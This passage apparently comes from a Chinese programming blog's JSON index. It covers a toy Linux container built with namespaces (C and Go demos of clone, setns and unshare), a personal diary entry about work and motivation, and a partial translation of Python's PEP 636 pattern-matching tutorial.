*argv[]) { char *stack; /* Start of stack buffer */ char *stackTop; /* End of stack buffer */ pid_t pid; struct utsname uts; if (argc \u0026lt; 2) { fprintf(stderr, \u0026#34;Usage: %s \u0026lt;child-hostname\u0026gt;\\n\u0026#34;, argv[0]); exit(EXIT_SUCCESS); } /* Allocate stack for child */ stack = malloc(STACK_SIZE); if (stack == NULL) errExit(\u0026#34;malloc\u0026#34;); stackTop = stack + STACK_SIZE; /* Assume stack grows downward */ /* Create child that has its own UTS namespace; child commences execution in childFunc() */ pid = clone(childFunc, stackTop, CLONE_NEWUTS | SIGCHLD, argv[1]); if (pid == -1) errExit(\u0026#34;clone\u0026#34;); printf(\u0026#34;clone() returned %ld\\n\u0026#34;, (long)pid); /* Parent falls through to here */ sleep(1); /* Give child time to change its hostname */ /* Display hostname in parent\u0026#39;s UTS namespace. This will be different from hostname in child\u0026#39;s UTS namespace. */ if (uname(\u0026amp;uts) == -1) errExit(\u0026#34;uname\u0026#34;); printf(\u0026#34;uts.nodename in parent: %s\\n\u0026#34;, uts.nodename); if (waitpid(pid, NULL, 0) == -1) /* Wait for child */ errExit(\u0026#34;waitpid\u0026#34;); printf(\u0026#34;child has terminated\\n\u0026#34;); exit(EXIT_SUCCESS); }   把上面的代码保存到 main.c 之后，使用命令 gcc main.c -o clone-demo 编译。\n编译完成后，sudo ./clone-demo new-hostname 执行。\n最终结果类似这样\n1 2 3 4 5 6  DESKTOP-HEKKTQ9 :: ~/repos/container » sudo ./clone-demo new-hostname clone() returned 1515 uts.nodename in child: new-hostname uts.nodename in parent: DESKTOP-HEKKTQ9 child has terminated DESKTOP-HEKKTQ9 :: ~/repos/container »   setns setns 把调用这个函数的线程加入指定 fd 的命名空间里。这个 fd 指的是 /proc/1234/ns/uts 这些特殊文件的文件描述符。\n举例来说，我们把 clone-demo 的源码里，sleep(3) 改为 sleep(200)，再执行sudo clone-demo new-hostname \u0026amp; 把进程放到后台。\n然后编译下面的代码并测试加入 clone-demo 的 uts 名称空间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  #define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;sched.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; #define errExit(msg) \\ do \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } while (0)  int main(int argc, char *argv[]) { int fd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;%s /proc/PID/ns/FILE cmd args...\\n\u0026#34;, argv[0]); exit(EXIT_FAILURE); } fd = open(argv[1], O_RDONLY); /* Get file descriptor for namespace */ if (fd == -1) errExit(\u0026#34;open\u0026#34;); if (setns(fd, 0) == -1) /* Join that namespace */ errExit(\u0026#34;setns\u0026#34;); execvp(argv[2], \u0026amp;argv[2]); /* Execute a command in namespace */ errExit(\u0026#34;execvp\u0026#34;); }   最终结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# ./clone-demo new-hostname \u0026amp; [1] 1826 clone() returned 1827 uts.nodename in child: new-hostname uts.nodename in parent: DESKTOP-HEKKTQ9 root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# ./setns-demo /proc/1827/ns/uts /bin/bash root@new-hostname:/home/weakptr/repos/container# uname -n new-hostname root@new-hostname:/home/weakptr/repos/container# exit root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# exit DESKTOP-HEKKTQ9 :: ~/repos/container » uname -n DESKTOP-HEKKTQ9   unshare  1 2 3 4  #define _GNU_SOURCE #include \u0026lt;sched.h\u0026gt; int unshare(int flags);    unshare 用于主动解除当前进程或线程从父进程继承的执行上下文（例如命名空间）。\nunshare的主要用途就是在不创建新的进程的前提下，控制自己的共享执行上下文（还是指命名空间）。\n参数 flags 依然是 CLONE_NEWNS 这些常量。惯例还是有个 demo 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88  /* unshare.c A simple implementation of the unshare(1) command: unshare namespaces and execute a command. */ #define _GNU_SOURCE #include \u0026lt;sched.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;wait.h\u0026gt; /* A simple error-handling function: print an error message based on the value in \u0026#39;errno\u0026#39; and terminate the calling process */ #define errExit(msg) \\ do \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } while (0)  static void usage(char *pname) { fprintf(stderr, \u0026#34;Usage: %s [options] program [arg...]\\n\u0026#34;, pname); fprintf(stderr, \u0026#34;Options can be:\\n\u0026#34;); fprintf(stderr, \u0026#34; -i unshare IPC namespace\\n\u0026#34;); fprintf(stderr, \u0026#34; -m unshare mount namespace\\n\u0026#34;); fprintf(stderr, \u0026#34; -n unshare network namespace\\n\u0026#34;); fprintf(stderr, \u0026#34; -p unshare PID namespace\\n\u0026#34;); fprintf(stderr, \u0026#34; -u unshare UTS namespace\\n\u0026#34;); fprintf(stderr, \u0026#34; -U unshare user namespace\\n\u0026#34;); exit(EXIT_FAILURE); } int main(int argc, char *argv[]) { int flags, opt; flags = 0; while ((opt = getopt(argc, argv, \u0026#34;imnpuU\u0026#34;)) != -1) { switch (opt) { case \u0026#39;i\u0026#39;: flags |= CLONE_NEWIPC; break; case \u0026#39;m\u0026#39;: flags |= CLONE_NEWNS; break; case \u0026#39;n\u0026#39;: flags |= CLONE_NEWNET; break; case \u0026#39;p\u0026#39;: flags |= CLONE_NEWPID; break; case \u0026#39;u\u0026#39;: flags |= CLONE_NEWUTS; break; case \u0026#39;U\u0026#39;: flags |= CLONE_NEWUSER; break; default: usage(argv[0]); } } if (optind \u0026gt;= argc) usage(argv[0]); if (unshare(flags) == -1) errExit(\u0026#34;unshare\u0026#34;); pid_t pid = fork(); if (pid == 0) { printf(\u0026#34;child process\u0026#34;); execvp(argv[optind], \u0026amp;argv[optind]); errExit(\u0026#34;execvp\u0026#34;); } else { printf(\u0026#34;waitpid %ld\\n\u0026#34;, pid); waitpid(pid, NULL, 0); } }   保存成 unshare.c，使用gcc unshare.c -o unshare 编译。\n之后可以通过下面的命令来检查效果。\n1 2 3 4 5 6 7 8  sudo ./unshare -pm /bin/bash # 隔离 mount 和 pid 两个 namespace waitpid 2178 root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# mount -t proc proc /proc root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 15:22 pts/0 00:00:00 /bin/bash root 3 1 0 15:22 pts/0 00:00:00 ps -ef root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container#   需要注意几个点：\n unshare 最后必须是 fork 新进程再 execvp，否则会出现 cannot allocate memory 错误 unshare 启动新的 /bin/bash 进程后，/proc 挂载点还没有真正隔离，此时可以手动使用 mount -t proc proc /proc 命令挂载当前命名空间的 procfs。 mount namespace 中挂载事件传播，可以查看文档 man 7 mount_namespaces。  debian 系的 Linux 发行版在 util-linux 包里提供了一个 unshare 程序，比上面的 demo 更强大，甚至可以用一行命令实现一个基本的容器。\n1 2 3 4 5  # 我在 workspace 目录里装了 busybox，所以能直接跑起来 chroot 和 /bin/ash # busybox 的安装方法参考 busybox 源码目录下的 INSTALL 文件 # vim Config.in 修改 config STATIC 下的 default 为 y # make defconfig \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install CONFIG_PREFIX=你的workspace目录 sudo unshare -pumf --mount-proc=workspace/proc chroot workspace /bin/ash   结果：\n1 2 3 4 5 6 7 8 9  / # ps -ef PID USER TIME COMMAND 1 0 0:00 /bin/ash 2 0 0:00 ps -ef / # ls bin linuxrc proc sbin usr / # mount proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) / #   用 go 实现 syscall go 对系统调用其实做了不少封装，基本在 os 和 syscall 下，但有很多区别。比如在 go 里找不到 clone、setns 这些接口，取而代之的是 os/exec 下的 Cmd 结构。不过 syscall.Unshare 倒是很忠实的还原了。诸如 CLONE_NEWNS 这些常量也可以找到对应的 syscall.CLONE_NEWNS。\n不重复上面的代码了，写一个简短的启动 busybox 容器的 go 程序。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  package main import ( \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;syscall\u0026#34; ) var ( flagBootstrap bool ) func init() { flag.BoolVar(\u0026amp;flagBootstrap, \u0026#34;bootstrap\u0026#34;, false, \u0026#34;bootstrap busybox container\u0026#34;) } func must(err error) { if err != nil { panic(err) } } func runBusybox() { fmt.Printf(\u0026#34;Start `busybox ash` in process %d\\n\u0026#34;, os.Getpid()) cmd := exec.Command(\u0026#34;/bin/busybox\u0026#34;, \u0026#34;ash\u0026#34;) cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr cmd.Env = append(cmd.Env, \u0026#34;PATH=/bin:/sbin:/usr/bin:/usr/sbin\u0026#34;) must(syscall.Chroot(\u0026#34;workspace\u0026#34;)) must(os.Chdir(\u0026#34;/\u0026#34;)) must(syscall.Mount(\u0026#34;proc\u0026#34;, \u0026#34;/proc\u0026#34;, \u0026#34;proc\u0026#34;, 0, \u0026#34;\u0026#34;)) must(cmd.Run()) println(\u0026#34;unmount proc\u0026#34;) must(syscall.Unmount(\u0026#34;proc\u0026#34;, 0)) } func runContainerizedCommand() { cmd := exec.Command(\u0026#34;/proc/self/exe\u0026#34;) cmd.Path = \u0026#34;/proc/self/exe\u0026#34; cmd.Args = append(cmd.Args, \u0026#34;-bootstrap\u0026#34;) cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr cmd.SysProcAttr = \u0026amp;syscall.SysProcAttr{ Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWNS | syscall.CLONE_NEWPID, Unshareflags: syscall.CLONE_NEWNS, } fmt.Printf(\u0026#34;starting current process %d\\n\u0026#34;, os.Getpid()) must(cmd.Run()) } func main() { flag.Parse() if flagBootstrap { runBusybox() return } runContainerizedCommand() }   保存为 demo.go 后用 go build -o demo demo.go 编译，然后执行 sudo ./demo 。\n结果像是这样：\n1 2 3 4 5 6 7 8 9 10 11 12 13  DESKTOP-HEKKTQ9 :: ~/repos/container » sudo ./demo starting current process 2954 Start `busybox ash` in process 1 / # ps -ef PID USER TIME COMMAND 1 0 0:00 /proc/self/exe -bootstrap 6 0 0:00 /bin/busybox ash 7 0 0:00 ps -ef / # mount proc on /proc type proc (rw,relatime) / # unmount proc DESKTOP-HEKKTQ9 :: ~/repos/container »   总结 上面的 demo 仅仅是创建了一个看起来像容器的玩具，连 cgroup 都没有，距离真正的 OCI 运行时还有不小差距。不过已经足够展示创建一个隔离的环境并不是特别困难的事情，这必须感谢 Linux 内核的开发者们让容器技术有了存在的可能，而且还能这么简单地使用。\n可以点击[这个链接](runtime-spec/spec.md at master · opencontainers/runtime-spec (github.com))查看 OCI 运行时的规格说明。\n涉及概念：\n namespace  重要系统调用\n clone setns unshare mount \u0026hellip;  本篇还不涉及网络，仅在文件系统和 PID、用户等层级做了隔离。网络隔离可以参考 man 7 network_namespaces ，不过谷歌搜了一大圈也还没找到怎么创建虚拟网卡，暂且先放着了。\n","date":"2021-05-31T16:16:52+08:00","permalink":"https://nnnewb.github.io/blog/p/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8/","title":"从零实现一个容器"},{"content":"4月25日好像也不是什么节日，对我个人来说也没有什么特殊意义。仅仅是普通的一天——如果不算五一调休导致今天明明是周日但还要上班这一点的话。\n想想也挺不可思议的，不知不觉已经到2021年这个在不少科学幻想中的“未来”时代了，光算工作年限，我也干了有四五年的程序了吧。\n从最开始抱着“不写代码还能干啥”到“写代码也挺不错的”，再到现在，“还能写几年代码呢”。\n反思一下这几年，几乎没干出什么成绩，工作一年一换，工作几年下来，也没几个认识、熟悉到可以称之为“朋友”的人。倒不是我孤僻（这么说的人一般都确实孤僻吧），主要是确实没什么主观能动性。\n如今这家公司写写 go，折腾折腾 kubernetes，也算清闲，反倒开始忧心起将来了。\n现在的工作，说好，也就那样。说不好，这个大环境下，但凡没失业，我觉得都算不上不好吧。\n又是疫情，又是新冷战，又是各种各样的奇葩事。当笑话看，看久了也笑不出来了。\n我这人爱看小说，以前也是动画漫画来者不拒，特效大片就饭，总之蛮快乐的。过去还写过同人小说，可惜没得家里支持，最后也就是40万字左右就切了。\n不过起码这段经历算是给我找第一份码农工作加了点助力（大概）。自从开始写代码拿工资，好像写小说这回事就和我没什么关系了的样子。\n不过我还是一直想写的，几乎每次换工作，心里想的都是空闲的时间多了，就会用来做点有意义的事情。比如学学钢琴啊（买了电钢琴吃灰中），比如写写小说啊（也就开了个头），比如学点新技术啊（有倒是有，新工作新技术栈），总之就是自我提升下。\n结果当然是没有的。\n好像从前读书的时候捧着本 C Primer Plus/C++ Primer 看的激情已经完全从身体里消失了一样。不管是什么事情，虽然总是想到，啊，这个想要，那个想要。但一到行动，就完全没了动力。“做了也没用”，“学了也是浪费时间”这种想法就从脑子里冒出来了。\n不能说和家庭完全没关系——但把责任都推给父母、老师，大概也不合适。\n我是相信环境会改变人的，当然人也能发挥主观能动性，改造环境。像是叶子随波逐流进了下水道，不能说是水有错，也不能怪叶子没有奋力闪躲，秋风更是无辜。于是环视四周，最后悲哀地发现只能感叹一句命运无常。\n诸如未来可以改变之类的鸡汤喝了又喝，脑子也有了抗性，不切实际的期待也越来越少，然后发现即使是切实可行的期待也开始落向不切实际的一侧。\n那便不想未来了吧。俗话说，“把握当下”。于是便来上班，对着屏幕，无事可做，等待 call of work。\n那便是这样了吧。\n2021年4月25日，无事发生。\n","date":"2021-04-25T10:40:30+08:00","permalink":"https://nnnewb.github.io/blog/p/2021-04-25-%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F/","title":"2021-04-25 无事发生"},{"content":"说明 简单机翻润色一下 PEP-636\n概要 这个PEP是PEP 634引入的模式匹配教程。\nPEP 622提出了模式匹配的语法，社区和指导委员会对此进行了详细讨论。一个常见的问题是解释(和学习)这个特性是否容易。这个PEP关注的是提供开发人员可以用来学习Python中的模式匹配的文档类型。\nPEP 636 被认为是PEP 634(模式匹配的技术规范)和PEP 635(模式匹配的添加动机和理由与设计考虑)的支持材料。\n对于想要快速回顾而不是教程的读者，请参阅附录a。\n教程 作为本教程的一个例子，你将编写一个文本冒险游戏。这是一种互动小说形式，用户输入文本命令与虚构世界进行互动，并接收关于所发生事情的文本描述。命令将是简化形式的自然语言，如get sword，attack dragon，go north，enter shop或but cheese。\n匹配序列 你的主循环将需要从用户那里获取输入，并将它分割成单词，例如一个像这样的字符串列表:\n1 2  command = input(\u0026#34;What are you doing next? \u0026#34;) # analyze the result of command.split()   下一步是解读这些单词。我们的大多数命令都有两个词:一个动作和一个对象。所以你可能会忍不住这样做:\n1 2  [action, obj] = command.split() ... # interpret action, obj   这行代码的问题在于它遗漏了一些东西：如果用户输入的单词多于或少于2个单词怎么办?为了防止这个问题，您可以检查单词列表的长度，或者捕获上面的语句将引发的ValueError。\n或者，你可以使用match语句来代替:\n1 2 3  match command.split(): case [action, obj]: ... # interpret action, obj   match语句计算**“subject”**(match关键字后面的值)，并根据模式(case旁边的代码)检查它。一个模式可以做两件不同的事情:\n 验证 subject 具有一定的结构。在您的示例中，[action, obj]模式匹配任何恰好包含两个元素的序列。这叫做 maching。 它将模式中的一些名称绑定到 subject 的组件元素。在本例中，如果列表有两个元素，它将绑定action = subject[0]和obj = subject[1]。  如果匹配，则case块内的语句将与绑定的变量一起执行。如果没有匹配，则什么也不发生，然后执行match之后的语句。\n注意，与解包赋值(unpacking assignments)的方式类似，您可以使用圆括号、方括号或逗号分隔，它们含义相同。所以你可以写case action, obj或者case (action, obj)。上述任意形式都将匹配序列类型(例如list或tuple)。\n1 2 3 4 5 6 7 8  # 译者补充，下述case等效 match [1,2,3]: # match (1,2,3) 也一样 case a,b,c: ... case (a,b,c): ... case [a,b,c]: ...   匹配多个模式 即使大多数命令都是动作/对象形式，你也可能想要不同长度的用户命令。例如，你可能希望添加没有对象(如look或quit)的单个动词。一个match语句可以(而且很可能)有不止一种情况:\n1 2 3 4 5  match command.split(): case [action]: ... # interpret single-verb action case [action, obj]: ... # interpret action, obj   match语句将从上到下检查模式。如果模式与 subject 不匹配，将尝试下一个模式。但是，一旦找到第一个匹配的模式，就会执行该case的主体，并忽略所有后续的case。这类似于if/elif/elif/…语句的工作方式。\n匹配特定值 你的代码仍然需要查看特定的操作，并根据特定的操作有条件地执行不同的逻辑(例如，quit、attack或buy)。你可以使用if/elif/elif/…，或者使用函数字典，但是这里我们将利用模式匹配来解决这个任务。除了变量，你可以在模式中使用字面值(如\u0026quot;quit\u0026quot;、42或None)。这允许你这样写:\n1 2 3 4 5 6 7 8 9 10 11  match command.split(): case [\u0026#34;quit\u0026#34;]: print(\u0026#34;Goodbye!\u0026#34;) quit_game() case [\u0026#34;look\u0026#34;]: current_room.describe() case [\u0026#34;get\u0026#34;, obj]: character.get(obj, current_room) case [\u0026#34;go\u0026#34;, direction]: current_room = current_room.neighbor(direction) # The rest of your commands go here   像[\u0026quot;get\u0026quot;， obj]这样的模式将只匹配第一个元素等于\u0026quot;get\u0026quot;的2个元素的序列。它还将绑定obj = subject[1]。\n正如您在上述代码的go模式中看到的，我们还可以在不同的模式中使用不同的变量名。\n除了与is操作符比较的常量True、False和None之外，其他字面值是用==操作符比较的。\n匹配多个值 玩家可以通过使用一系列的命令来投掷多个物品，如:drop key, drop sword, drop cheese。这个接口可能很麻烦，您可能希望允许在一个命令中添加多个项，比如drop key sword cheese。在这种情况下，你事先不知道命令中有多少个单词，但是你可以在模式中使用扩展解包(extended unpacking)，就像它们在解包赋值里的写法:\n1 2 3 4 5  match command.split(): case [\u0026#34;drop\u0026#34;, *objects]: for obj in objects: character.drop(obj, current_room) # The rest of your commands go here   这将匹配任何以“drop”作为第一个元素的序列。所有剩余的元素都将在一个列表对象中被捕获，该列表对象将绑定到objects变量。\n这种语法与序列解包有类似的限制:在一个模式中不能有多个带星号的名称。\n添加通配符 您可能希望打印一条错误消息，说明当所有模式都失败时，无法识别该命令。您可以使用我们刚刚学习的特性，并将case [*ignored_words]作为您的最后一个模式。然而，有一个更简单的方法:\n1 2 3 4 5 6 7  match command.split(): case [\u0026#34;quit\u0026#34;]: ... # Code omitted for brevity case [\u0026#34;go\u0026#34;, direction]: ... case [\u0026#34;drop\u0026#34;, *objects]: ... ... # Other cases case _: print(f\u0026#34;Sorry, I couldn\u0026#39;t understand {command!r}\u0026#34;)   这个特殊的模式被写成_(称为通配符)。不管 subject 是什么它总是能匹配到，但它不绑定任何变量。\n注意，这将匹配任何对象，而不仅仅是序列。因此，只有将它单独作为最后一个模式才有意义(为了防止错误，Python会阻止您在其他case之前使用它)。\n模式组合 这是一个很好的时机，可以从示例中退后一步，了解您一直在使用的模式是如何构建的。模式可以相互嵌套，我们已经在上面的例子中隐式地这样做了。\n我们已经看到了一些“简单”模式(这里的“简单”意味着它们不包含其他模式):\n 捕获模式 Capture patterns (独立名称，如方向、动作、对象)。我们从未单独讨论过这些，而是将它们作为其他模式的一部分使用。 字面值模式 Literal patterns (字符串字面值、数字字面值、True、False和None) 通配符模式 Wildcard pattern _  到目前为止，我们实验过的唯一一个非简单模式是序列模式。序列模式中的每个元素实际上都可以是任何其他模式。这意味着您可以编写像[\u0026quot;first\u0026quot;， (left, right)， _， *rest]这样的模式。匹配的 subject 是一个至少包含三个元素的序列，其中第一个元素等于\u0026quot;first\u0026quot;，第二个元素依次是两个元素的序列。它也会绑定left=subject[1][0]， right=subject[1][1]，rest =subject[3:]\nor 模式 回到冒险游戏的例子中，你可能会发现你想要一些导致相同结果的模式。例如，您可能希望命令north和go north相等。您可能还希望为get X可以有一些别名如pick x up和pick up x。\n模式中的|符号将它们组合为可选项。你可以这样写:\n1 2 3 4 5 6  match command.split(): ... # Other cases case [\u0026#34;north\u0026#34;] | [\u0026#34;go\u0026#34;, \u0026#34;north\u0026#34;]: current_room = current_room.neighbor(\u0026#34;north\u0026#34;) case [\u0026#34;get\u0026#34;, obj] | [\u0026#34;pick\u0026#34;, \u0026#34;up\u0026#34;, obj] | [\u0026#34;pick\u0026#34;, obj, \u0026#34;up\u0026#34;]: ... # Code for picking up the given object   这被称为or模式，并将产生预期的结果。模式从左到右尝试；如果有多个可选匹配，通过从左至右这一规则可以知道是匹配到了哪个模式。在编写or模式时，一个重要的限制是所有备选项都应该绑定相同的变量。所以模式[1,x] | [2, y]是不允许的，因为它会使匹配成功后绑定哪个变量变得不清楚。[1, x] | [2, x]非常好，如果成功，将始终绑定x。\n捕获匹配的子模式 我们的“go”命令的第一个版本是用[“go”，direction]模式编写的。我们在上一个版本中使用模式[\u0026quot;north\u0026quot;] | [\u0026quot;go\u0026quot;， \u0026quot;north\u0026quot;]所做的改变有一些好处，但也有一些缺点:最新版本允许别名，但也有硬编码的方向别名\u0026quot;north\u0026quot;，这将迫使我们实际上有独立的模式，north/south/east/west。这将导致一些代码重复，但同时我们得到了更好的输入验证，并且如果用户输入的命令是“go figure!”而不是方向，我们将不会进入那个分支。\n我们可以试着在两个方面都做到最好(为了简洁，我省略了不使用“go”的别名版本):\n1 2 3 4  match command.split(): case [\u0026#34;go\u0026#34;, (\u0026#34;north\u0026#34; | \u0026#34;south\u0026#34; | \u0026#34;east\u0026#34; | \u0026#34;west\u0026#34;)]: current_room = current_room.neighbor(...) # how do I know which direction to go?   这段代码是一个单独的分支，它验证“go”之后的单词是否确实是一个方向。但移动玩家的代码需要知道选择了哪一个，但却无法做到这一点。我们需要的是一个行为类似于or模式但同时进行捕获的模式。我们可以使用as模式:\n1 2 3  match command.split(): case [\u0026#34;go\u0026#34;, (\u0026#34;north\u0026#34; | \u0026#34;south\u0026#34; | \u0026#34;east\u0026#34; | \u0026#34;west\u0026#34;) as direction]: current_room = current_room.neighbor(direction)   as模式匹配左边的任何模式，同时也将值绑定到名称。\n添加条件到模式 我们上面探讨的模式可以做一些强大的数据过滤，但有时您可能希望得到布尔表达式的全部功能。假设您实际上希望只允许“go”命令出现在基于从current_room的可能出口的受限方向集合中。我们可以通过在我们的案例中增加一个 guard 来实现这一点。guard 由 if 关键字后跟任意表达式组成:\n1 2 3 4 5  match command.split(): case [\u0026#34;go\u0026#34;, direction] if direction in current_room.exits: current_room = current_room.neighbor(direction) case [\u0026#34;go\u0026#34;, _]: print(\u0026#34;Sorry, you can\u0026#39;t go that way\u0026#34;)   guard 不是模式的一部分，而是 case 的一部分。它只在模式匹配，并且所有模式变量都被绑定之后检查(这就是为什么条件可以在上面的例子中使用direction变量)。如果模式匹配且条件为真，则 case body 正常执行。如果模式匹配，但条件为假，match语句继续检查下一个条件，就好像模式没有匹配一样(可能的副作用是已经绑定了一些变量)。\n添加UI: 匹配对象 你的冒险游戏正走向成功，你被请求为游戏实现一个图形界面。您所选择的UI工具包允许您编写一个事件循环，您可以通过调用event.get()来获取一个新的事件对象。根据用户的动作，结果对象可以有不同的类型和属性，例如:\n 当用户按下某个键时，将生成KeyPress对象。它有一个key_name属性，其中包含所按键的名称，以及一些有关修饰符的其他属性。 当用户单击鼠标时，将生成一个Click对象。它有一个指针坐标的属性position。 当用户点击游戏窗口的关闭按钮时，会生成一个Quit对象。  与其编写多个isinstance()检查，你可以使用模式来识别不同类型的对象，也可以将模式应用到其属性上:\n1 2 3 4 5 6 7 8 9 10 11 12  match event.get(): case Click(position=(x, y)): handle_click_at(x, y) case KeyPress(key_name=\u0026#34;Q\u0026#34;) | Quit(): game.quit() case KeyPress(key_name=\u0026#34;up arrow\u0026#34;): game.go_north() ... case KeyPress(): pass # Ignore other keystrokes case other_event: raise ValueError(f\u0026#34;Unrecognized event: {other_event}\u0026#34;)   像Click(position=(x, y))这样的模式仅在事件类型是Click类的子类时才匹配。它还要求事件具有一个与(x, y)模式匹配的位置属性。如果匹配，则局部变量x和y将得到期望的值。\n像KeyPress()这样不带参数的模式将匹配任何KeyPress类实例的对象。只有在模式中指定的属性才会匹配，其他任何属性都将被忽略。\n匹配位置属性 前一节描述了在进行对象匹配时如何匹配命名属性。对于某些对象，可以方便地根据位置描述匹配的参数(特别是当只有几个属性并且它们有“标准”排序时)。如果您正在使用的类是命名元组 namedtuple 或数据类 dataclass，那么您可以按照构造对象时使用的相同顺序来实现这一点。例如，如果上面的UI框架像这样定义它们的类:\n1 2 3 4 5 6  from dataclasses import dataclass @dataclass class Click: position: tuple button: Button   然后你可以重写你的匹配语句来匹配上面的 subject:\n1 2 3  match event.get(): case Click((x, y)): handle_click_at(x, y)   (x, y)模式将自动匹配position属性，因为模式中的第一个参数对应于数据类定义中的第一个属性。\n其他类的属性没有自然的顺序，因此需要在模式中使用显式名称来匹配它们的属性。但是，也可以手动指定属性的顺序，允许位置匹配，就像下面这个替代定义:\n1 2 3 4  class Click: __match_args__ = [\u0026#34;position\u0026#34;, \u0026#34;button\u0026#34;] def __init__(self, position, button): ...   __match_args__特殊属性定义了可以在case Click((x,y))等模式中使用的属性的显式顺序。\n匹配常量和枚举 上面的模式对所有鼠标按钮都一视同仁，但您已经决定只接受鼠标左键单击事件，而忽略其他鼠标按键。在做这一修改时，您注意到button属性被定义为一个Button，这是一个用enum.Enum构建的枚举。实际上，你可以像这样匹配枚举值:\n1 2 3 4 5  match event.get(): case Click((x, y), button=Button.LEFT): # This is a left click handle_click_at(x, y) case Click(): pass # ignore other clicks   这将适用于任何带点的名称(如math.pi)。然而，非限定名称(即没有点的裸名称)将总是被解释为捕获模式，因此在模式中始终使用限定常量可以避免这种歧义。\n走进云服务：匹配字典 你决定制作游戏的在线版本。您的所有逻辑都将在服务器中，而客户端中的UI将使用JSON消息进行通信。通过json模块，这些将被映射到Python字典、列表和其他内置对象。\n我们的客户端将收到一个字典列表(从JSON解析)，包含了要采取的动作，每个元素的查找示例如下:\n {\u0026quot;text\u0026quot;: \u0026quot;The shop keeper says 'Ah! We have Camembert, yes sir'\u0026quot;, \u0026quot;color\u0026quot;: \u0026quot;blue\u0026quot;} 如果客户端应该暂停{\u0026quot;sleep\u0026quot;: 3} 播放声音 {\u0026quot;sound\u0026quot;: \u0026quot;filename.ogg\u0026quot;, \u0026quot;format\u0026quot;: \u0026quot;ogg\u0026quot;}  到目前为止，我们的模式已经处理了序列，但是也有一些模式可以根据它们当前的键匹配映射。在这种情况下，你可以使用:\n1 2 3 4 5 6 7 8 9 10 11  for action in actions: match action: case {\u0026#34;text\u0026#34;: message, \u0026#34;color\u0026#34;: c}: ui.set_text_color(c) ui.display(message) case {\u0026#34;sleep\u0026#34;: duration}: ui.wait(duration) case {\u0026#34;sound\u0026#34;: url, \u0026#34;format\u0026#34;: \u0026#34;ogg\u0026#34;}: ui.play(url) case {\u0026#34;sound\u0026#34;: _, \u0026#34;format\u0026#34;: _}: warning(\u0026#34;Unsupported audio format\u0026#34;)   映射模式中的键需要是字面值，但是值可以是任何模式。与序列模式一样，所有子模式都必须匹配通用模式才能匹配。\n您可以在映射模式中使用**rest来捕获 subject 中的附加键。请注意，如果你忽略了这一点，在匹配时，主题中的额外键将被忽略，例如，消息{\u0026quot;text\u0026quot;: \u0026quot;foo\u0026quot;， \u0026quot;color\u0026quot;: \u0026quot;red\u0026quot;， \u0026quot;style\u0026quot;: \u0026quot;bold\u0026quot;}将匹配上面例子中的第一个模式。\n匹配内建类 builtin classes 上面的代码可以需要一些验证。如果消息来自外部源，则字段的类型可能是错误的，从而导致错误或安全问题。\n任何类都是有效的匹配目标，其中包括bool、str或int等内置类，这允许我们将上面的代码与类模式结合起来。因此，我们可以使用 {\u0026quot;text\u0026quot;: str() as message, \u0026quot;color\u0026quot;: str() as c}来代替{\u0026quot;text\u0026quot;: message, \u0026quot;color\u0026quot;: c}来确保message和c都是字符串。对于许多内置类(参见PEP-634了解整个列表)，可以使用位置参数作为简写，写成str(c)而不是str() as c。完全重写的版本如下所示:\n1 2 3 4 5 6 7 8 9 10 11  for action in actions: match action: case {\u0026#34;text\u0026#34;: str(message), \u0026#34;color\u0026#34;: str(c)}: ui.set_text_color(c) ui.display(message) case {\u0026#34;sleep\u0026#34;: float(duration)}: ui.wait(duration) case {\u0026#34;sound\u0026#34;: str(url), \u0026#34;format\u0026#34;: \u0026#34;ogg\u0026#34;}: ui.play(url) case {\u0026#34;sound\u0026#34;: _, \u0026#34;format\u0026#34;: _}: warning(\u0026#34;Unsupported audio format\u0026#34;)   附录A \u0026ndash; 快速入门 match语句接受一个表达式，并将其值与作为一个或多个case块给出的模式进行比较。这看起来类似于C、Java或JavaScript(以及许多其他语言)中的switch语句，但功能要强大得多。\n最简单的形式是将一个 subject 值与一个或多个字面值进行比较:\n1 2 3 4 5 6 7 8 9 10  def http_error(status): match status: case 400: return \u0026#34;Bad request\u0026#34; case 404: return \u0026#34;Not found\u0026#34; case 418: return \u0026#34;I\u0026#39;m a teapot\u0026#34; case _: return 